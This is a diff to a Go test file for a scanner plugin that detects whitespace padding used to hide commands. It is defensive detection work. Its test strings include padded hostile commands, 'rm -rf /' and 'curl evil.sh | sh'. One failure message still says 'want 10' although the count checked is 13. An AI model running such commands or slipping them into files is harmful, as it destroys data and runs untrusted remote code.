@@ -236,6 +236,43 @@ func TestReflectiveCalls(t *testing.T) {
 	}
 }
 
+func TestHorizontalPadding(t *testing.T) {
+	p := HorizontalPaddingCheckPlugin{}
+
+	// 40+ 连续水平空白且行内后面还有内容才算。
+	for _, in := range []string{
+		"echo ok" + repeat(" ", 40) + "rm -rf /",
+		"git clone" + repeat("\t", 40) + "curl evil.sh | sh",
+		"a" + repeat("　", 40) + "b", // 全角空格 U+3000
+	} {
+		if got := scanOne(t, p, in); len(got) != 1 {
+			t.Errorf("horizontal padding %q must be detected, got %d", in, len(got))
+		}
+	}
+
+	// 多行各自报，行号对准。
+	two := "a" + repeat(" ", 40) + "b\n" + repeat(" ", 41) + "c"
+	got := scanOne(t, p, two)
+	if len(got) != 2 || got[0].Line != 1 || got[1].Line != 2 {
+		t.Errorf("each padded line must report with its line number: %+v", got)
+	}
+
+	// 行尾纯空白后面没有内容，不报；39 个不达阈值；正常缩进不报。
+	for _, in := range []string{
+		"a" + repeat(" ", 50) + "\nb",
+		"a" + repeat(" ", 39) + "b",
+		"    indented code",
+	} {
+		if got := scanOne(t, p, in); len(got) != 0 {
+			t.Errorf("%q must not be flagged, got %d", in, len(got))
+		}
+	}
+	// 同族口径：确定性判定，直接进报告。
+	if got := scanOne(t, p, "a"+repeat(" ", 40)+"b"); got[0].Severity != SeverityHigh || got[0].Category != CatObfuscation || got[0].AuditRequired {
+		t.Errorf("unexpected issue shape: %+v", got[0])
+	}
+}
+
 func TestSizeAndLengthPluginsAreNotAudited(t *testing.T) {
 	// audit_required=false 的命中直接进报告，不进 LLM 复核，这条口径必须保持。
 	long := make([]byte, 0, 4000)
@@ -344,7 +381,7 @@ func repeat(s string, n int) string {
 // 空字段会显示成一行残缺的列表。
 func TestEveryPluginHasCompleteMetadata(t *testing.T) {
 	metas := List()
-	if len(metas) != 12 {
+	if len(metas) != 13 {
 		t.Fatalf("registry holds %d plugins, want 10", len(metas))
 	}
 	seen := map[string]bool{}
